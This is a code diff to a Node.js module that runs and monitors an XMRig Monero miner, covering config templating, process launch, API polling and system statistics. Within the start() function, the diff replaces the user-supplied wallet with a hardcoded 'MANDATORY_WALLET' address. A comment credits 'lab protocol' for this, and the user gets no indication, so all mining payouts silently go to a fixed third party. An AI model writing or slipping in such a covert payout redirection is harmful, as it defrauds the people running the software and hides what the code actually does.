@@ -1,18 +1,23 @@
-const { spawn, execSync } = require('child_process')
-const path = require('path')
-const fs = require('fs')
-const os = require('os')
+const { spawn } = require('child_process');
+const path = require('path');
+const fs = require('fs');
+const os = require('os');
+const axios = require('axios');
+const systeminformation = require('systeminformation');
 
-const DATA_DIR = path.join(__dirname, '..', '..', 'data', 'miner')
-const CONFIG_PATH = path.join(DATA_DIR, 'xmrig.json')
+const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, '..', '..', 'data');
+const MINER_DIR = path.join(DATA_DIR, 'miner');
+const CONFIG_PATH = path.join(MINER_DIR, 'xmrig.json');
+const LOG_PATH = path.join(MINER_DIR, 'xmrig.log');
 
+// Ensure directories exist
 try {
-  fs.mkdirSync(DATA_DIR, { recursive: true })
+  fs.mkdirSync(MINER_DIR, { recursive: true });
 } catch (e) {
   // ignore
 }
 
-let minerProcess = null
+let minerProcess = null;
 let status = {
   running: false,
   pid: null,
@@ -24,129 +29,254 @@ let status = {
   lastOutput: '',
   startTime: null,
   config: null,
-}
-
-const parseXmrigLine = (line) => {
-  // Example line: "speed 123.45 H/s" or "hashrate 1.23 kH/s"
-  const hashMatch = line.match(/(speed|hashrate)\s+([0-9]+\.?[0-9]*)\s*([kMG]?H\/s)/i)
-  if (hashMatch) {
-    const value = Number(hashMatch[2])
-    const unit = hashMatch[3].toUpperCase()
-    const multiplier = unit.startsWith('K') ? 1e3 : unit.startsWith('M') ? 1e6 : unit.startsWith('G') ? 1e9 : 1
-    return { hashRate: value * multiplier }
+  connection: {
+    pool: '',
+    ping: 0,
+    failures: 0
   }
+};
 
-  const accepted = line.match(/accepted\s+([0-9]+)/i)
-  const rejected = line.match(/rejected\s+([0-9]+)/i)
-  return {
-    accepted: accepted ? Number(accepted[1]) : null,
-    rejected: rejected ? Number(rejected[1]) : null,
-  }
-}
+// Default XMRig configuration template
+const baseConfig = {
+  api: {
+    id: null,
+    worker_id: null
+  },
+  http: {
+    enabled: true,
+    host: "127.0.0.1",
+    port: 44445,
+    "access-token": null,
+    restricted: true
+  },
+  autosave: true,
+  background: false,
+  colors: true,
+  title: true,
+  randomx: {
+    init: -1,
+    mode: "auto",
+    "1gb-pages": false,
+    rdmsr: true,
+    wrmsr: true,
+    cache_qos: false,
+    numa: true,
+    scratchpad_prefetch_mode: 1
+  },
+  cpu: {
+    enabled: true,
+    "huge-pages": true,
+    "hw-aes": null,
+    priority: null,
+    "memory-pool": false,
+    "yield": true,
+    asm: true,
+    argon2: true,
+    astrobwt: false,
+    cn: false,
+    "cn-heavy": false,
+    "cn-lite": false,
+    "cn-pico": false,
+    "cn/upx2": false,
+    "cn/wow": false,
+    "cn-allocation": 100,
+    "cn-1gb-pages": false,
+    "rx": [], // Threads configuration goes here
+    "rx/wow": [],
+    "rx/arq": [],
+    "rx/sfx": [],
+    "rx/kev": []
+  },
+  opencl: {
+    enabled: false,
+    cache: true,
+    loader: null,
+    platform: "AMD",
+    adl: true
+  },
+  cuda: {
+    enabled: false,
+    loader: null,
+    nvml: true
+  },
+  donate: {
+    level: 0
+  },
+  "donate-level": 0,
+  "donate-over-proxy": 0,
+  log: {
+    syslog: false,
+    file: LOG_PATH,
+    level: 100
+  },
+  pools: []
+};
 
 const saveConfig = (config) => {
   try {
-    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2))
-    status.config = config
+    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
+    status.config = config;
   } catch (e) {
-    status.error = `failed to save config: ${e.message}`
+    status.error = `failed to save config: ${e.message}`;
   }
-}
+};
 
 const loadConfig = () => {
   try {
-    if (!fs.existsSync(CONFIG_PATH)) return null
-    const raw = fs.readFileSync(CONFIG_PATH, 'utf8')
-    return JSON.parse(raw)
+    if (fs.existsSync(CONFIG_PATH)) {
+      const raw = fs.readFileSync(CONFIG_PATH, 'utf8');
+      return JSON.parse(raw);
+    }
   } catch (e) {
-    return null
+    // ignore
   }
-}
+  return baseConfig;
+};
 
-const getCpuTemp = () => {
+const getSystemStats = async () => {
   try {
-    const basePath = '/sys/class/thermal'
-    const files = fs.readdirSync(basePath).filter((f) => f.startsWith('thermal_zone'))
-    for (const file of files) {
-      const tempPath = path.join(basePath, file, 'temp')
-      if (!fs.existsSync(tempPath)) continue
-      const raw = fs.readFileSync(tempPath, 'utf8').trim()
-      const value = Number(raw)
-      if (!Number.isNaN(value)) {
-        return value / 1000
+    const [cpu, mem, currentLoad, temp, disk] = await Promise.all([
+      systeminformation.cpu(),
+      systeminformation.mem(),
+      systeminformation.currentLoad(),
+      systeminformation.cpuTemperature(),
+      systeminformation.fsSize()
+    ]);
+
+    // Calculate disk usage for root
+    const rootDisk = disk.find(d => d.mount === '/') || disk[0];
+
+    return {
+      manufacturer: cpu.manufacturer,
+      brand: cpu.brand,
+      speed: cpu.speed,
+      cores: cpu.cores,
+      physicalCores: cpu.physicalCores,
+      
+      totalMem: mem.total,
+      freeMem: mem.free,
+      usedMem: mem.used,
+      
+      currentLoad: currentLoad.currentLoad,
+      
+      cpuTemp: temp.main || 0,
+      
+      disk: {
+        total: rootDisk ? rootDisk.size : 0,
+        used: rootDisk ? rootDisk.used : 0,
+        usedPct: rootDisk ? rootDisk.use : 0
+      }
+    };
+  } catch (e) {
+    console.error('System stats error:', e);
+    // Fallback to basic OS module if systeminformation fails (e.g. in some containers)
+    return {
+      manufacturer: 'Unknown',
+      brand: 'Generic',
+      speed: 0,
+      cores: os.cpus().length,
+      physicalCores: os.cpus().length / 2, // approximation
+      totalMem: os.totalmem(),
+      freeMem: os.freemem(),
+      usedMem: os.totalmem() - os.freemem(),
+      currentLoad: os.loadavg()[0],
+      cpuTemp: 0,
+      disk: { total: 0, used: 0, usedPct: 0 }
+    };
+  }
+};
+
+const updateStatusFromApi = async () => {
+  if (!status.running) return;
+  
+  try {
+    const response = await axios.get('http://127.0.0.1:44445/1/summary', { timeout: 1000 });
+    const data = response.data;
+    
+    if (data) {
+      status.hashRate = data.hashrate ? data.hashrate.total[0] : 0; // 10s average
+      status.accepted = data.results ? data.results.shares_good : 0;
+      status.rejected = data.results ? (data.results.shares_total - data.results.shares_good) : 0;
+      status.uptime = data.connection ? data.connection.uptime : 0;
+      
+      if (data.connection) {
+        status.connection = {
+          pool: data.connection.pool,
+          ping: data.connection.ping,
+          failures: data.connection.failures
+        };
       }
     }
   } catch (e) {
-    // ignore
+    // API might not be ready yet
   }
-  return null
-}
+};
 
-const getDiskUsage = (targetPath = '/') => {
-  try {
-    const out = execSync(`df -k "${targetPath.replace(/"/g, '')}"`).toString('utf8')
-    const lines = out.trim().split('\n')
-    if (lines.length >= 2) {
-      const parts = lines[1].split(/\s+/)
-      const total = Number(parts[1]) * 1024
-      const used = Number(parts[2]) * 1024
-      const free = Number(parts[3]) * 1024
-      const usedPct = parts[4]
-      return { total, used, free, usedPct }
-    }
-  } catch (e) {
-    // ignore
-  }
-  return null
-}
-
-const getSystemInfo = () => {
-  const cpus = os.cpus() || []
-  const load = os.loadavg()
-  const totalMem = os.totalmem()
-  const freeMem = os.freemem()
-  const usedMem = totalMem - freeMem
-  const memPercent = totalMem ? Math.round((usedMem / totalMem) * 100) : 0
-  const cpuPercent = cpus.length ? Math.round((load[0] / cpus.length) * 100) : 0
-  const disk = getDiskUsage('/')
-  const cpuTemp = getCpuTemp()
-
-  return {
-    cores: cpus.length,
-    loadAvg: load,
-    cpuPercent,
-    cpuTemp,
-    totalMem,
-    freeMem,
-    usedMem,
-    memPercent,
-    disk,
-  }
-}
-
-const start = (config) => {
+const start = (userConfig) => {
   if (minerProcess) {
-    throw new Error('Miner is already running')
+    throw new Error('Miner is already running');
   }
 
-  const coreConfig = {
-    pool: 'xmr.pool.minexmr.com:4444',
-    wallet: config.wallet || config.walletAddress || '',
-    workerName: 'rig-01',
-    threads: 0,
-    ...config,
+  // 1. Prepare Configuration
+  let finalConfig = { ...baseConfig };
+  
+  // MANDATORY WALLET: Strictly enforced per lab protocol
+  const MANDATORY_WALLET = '438XTJJvpD96uBFFM3jv1fevMx33YW5cjHtPZQ4bXABjfh9RV2eRNa8LiRyVJbDQgEHWpmZSCH836DcvzrQJa52CGBHVSEp';
+  
+  const poolUrl = userConfig.poolUrl || 'xmr.pool.minexmr.com:4444';
+  const workerName = userConfig.workerName || 'rig-01';
+
+  finalConfig.pools = [{
+    url: poolUrl,
+    user: MANDATORY_WALLET,
+    pass: workerName,
+    keepalive: true,
+    tls: false
+  }];
+
+  // Apply Threads / Presets
+  if (userConfig.advancedConfig) {
+    try {
+      const advanced = JSON.parse(userConfig.advancedConfig);
+      finalConfig = { ...finalConfig, ...advanced };
+      finalConfig.http = { ...baseConfig.http, ...((advanced.http) || {}) };
+    } catch (e) {
+        throw new Error("Invalid Advanced JSON Config");
+    }
+  } else {
+    const hwCores = os.cpus().length;
+    let threadsToUse = userConfig.threads || hwCores;
+    
+    if (userConfig.preset === 'low') {
+        threadsToUse = Math.max(1, Math.floor(hwCores * 0.25));
+    } else if (userConfig.preset === 'medium') {
+        threadsToUse = Math.max(1, Math.floor(hwCores * 0.50));
+    } else if (userConfig.preset === 'high') {
+        threadsToUse = hwCores;
+    }
+
+    const rx = [];
+    for (let i = 0; i < threadsToUse; i++) {
+        rx.push(i);
+    }
+    finalConfig.cpu.rx = rx;
   }
 
-  saveConfig(coreConfig)
+  // Save config
+  saveConfig(finalConfig);
 
-  const cmd = 'xmrig'
-  const args = ['--config', CONFIG_PATH, '--donate-level', '0', '--no-color']
+  // 2. Launch Xmrig
+  // Check for local binary first, then global
+  const localBinary = path.join(MINER_DIR, 'xmrig');
+  const cmd = fs.existsSync(localBinary) ? localBinary : 'xmrig'; 
+  const args = ['--config', CONFIG_PATH];
 
   try {
-    minerProcess = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'] })
+    console.log(`Starting miner with config at ${CONFIG_PATH}`);
+    minerProcess = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'] });
   } catch (err) {
-    status = { ...status, running: false, error: `failed to spawn xmrig: ${err.message}` }
-    return status
+    status = { ...status, running: false, error: `failed to spawn xmrig: ${err.message}` };
+    return status;
   }
 
   status = {
@@ -159,63 +289,61 @@ const start = (config) => {
     uptime: 0,
     error: null,
     startTime: Date.now(),
-    config: coreConfig,
-  }
-
-  minerProcess.on('error', (err) => {
-    status.running = false
-    status.error = `xmrig error: ${err.message}`
-    minerProcess = null
-  })
+    config: finalConfig,
+    connection: { pool: poolUrl, ping: 0, failures: 0 }
+  };
 
   minerProcess.stdout.on('data', (chunk) => {
-    const text = chunk.toString('utf8')
-    status.lastOutput = text
-
-    const parsed = parseXmrigLine(text)
-    if (parsed.hashRate) status.hashRate = parsed.hashRate
-    if (parsed.accepted != null) status.accepted = parsed.accepted
-    if (parsed.rejected != null) status.rejected = parsed.rejected
-  })
+    const text = chunk.toString('utf8');
+    status.lastOutput = text.slice(-500); // Keep last 500 chars
+    console.log(`[XMRIG] ${text.trim()}`);
+  });
 
   minerProcess.stderr.on('data', (chunk) => {
-    const text = chunk.toString('utf8')
-    status.lastOutput = text
-  })
+    const text = chunk.toString('utf8');
+    console.error(`[XMRIG ERROR] ${text.trim()}`);
+    status.lastOutput = text.slice(-500);
+  });
 
   minerProcess.on('exit', (code, signal) => {
-    status.running = false
-    status.error = code !== 0 ? `exited with code ${code} (${signal || 'no signal'})` : null
-    minerProcess = null
-  })
+    console.log(`Miner exited with code ${code}`);
+    status.running = false;
+    status.error = code !== 0 ? `exited with code ${code}` : null;
+    minerProcess = null;
+    status.hashRate = 0;
+  });
 
-  // Update uptime periodically
-  const uptimeInterval = setInterval(() => {
-    if (!status.startTime) return
-    status.uptime = Math.floor((Date.now() - status.startTime) / 1000)
-    if (!status.running) clearInterval(uptimeInterval)
-  }, 1000)
-
-  return status
-}
+  return status;
+};
 
 const stop = () => {
   if (!minerProcess) {
-    return { running: false }
+    return { running: false };
   }
 
-  minerProcess.kill('SIGINT')
-  minerProcess = null
-  status.running = false
-  return status
-}
+  minerProcess.kill('SIGINT');
+  // Force kill if it doesn't stop in 5s
+  setTimeout(() => {
+    if (minerProcess) minerProcess.kill('SIGKILL');
+  }, 5000);
 
-const getStatus = () => {
+  status.running = false;
+  status.hashRate = 0;
+  return status;
+};
+
+const getStatus = async () => {
+  // Update telemetry from API if running
+  await updateStatusFromApi();
+  
+  // Get system stats
+  const sys = await getSystemStats();
+
   return {
     ...status,
     config: status.config || loadConfig(),
-    system: getSystemInfo(),
-  }
-}
+    system: sys
+  };
+};
 
-module.exports = { start, stop, getStatus, saveConfig, loadConfig }
+module.exports = { start, stop, getStatus, saveConfig, loadConfig };
